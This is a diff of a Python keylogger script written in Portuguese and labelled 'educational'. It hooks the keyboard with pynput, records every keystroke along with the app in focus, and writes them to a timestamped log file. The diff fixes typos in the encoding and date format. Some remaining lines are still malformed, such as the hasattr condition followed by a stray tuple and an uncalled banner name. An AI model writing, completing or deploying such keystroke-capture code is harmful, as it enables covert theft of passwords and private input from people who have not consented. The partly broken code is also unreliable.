@@ -96,8 +96,9 @@ def ao_prescionar(tecla) :
       if app_novo != app_atual:
        app_atual = app_novo
        registrar (f"📱 App em foco → [{app_atual}]")
-
-       if hasattr: (tecla, "char") and tecla.char is not None : (letra, numero, simbolo)
+      
+       if hasattr (tecla, "char") and tecla.char is not  None : (letra, numero, simbolo)
+      
        registrar (f"⌨️  Tecla normal   → '{tecla.char}'   | App: {app_atual}")
    else :
     nome = teclas_especiais.get(tecla, str (tecla) .replace ("key.", ""). upper ())
@@ -110,10 +111,11 @@ def ao_soltar (tecla) :
 if __name__ == "__main__":
   banner_educacional
 
-  with open (caminho_log, "w", encoding="ufg-8") as f:
+  with open (caminho_log, "w", encoding="utf-8") as f:
     f. write ("=" * 60 + "\n")
     f.write (" log - keyloger educacional\n")
-    f.write(f "sessão:{datetime.datetime.now().strftime('%d/%m/%y%h:%m:%s')}\n")
+    f.write (f"  Sessão: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
     f.write("=" * 60 + "\n\n")
 
     with keyboard.Listener( on_press= ao_prescionar, on_release= ao_soltar) as lister: lister.join()
+
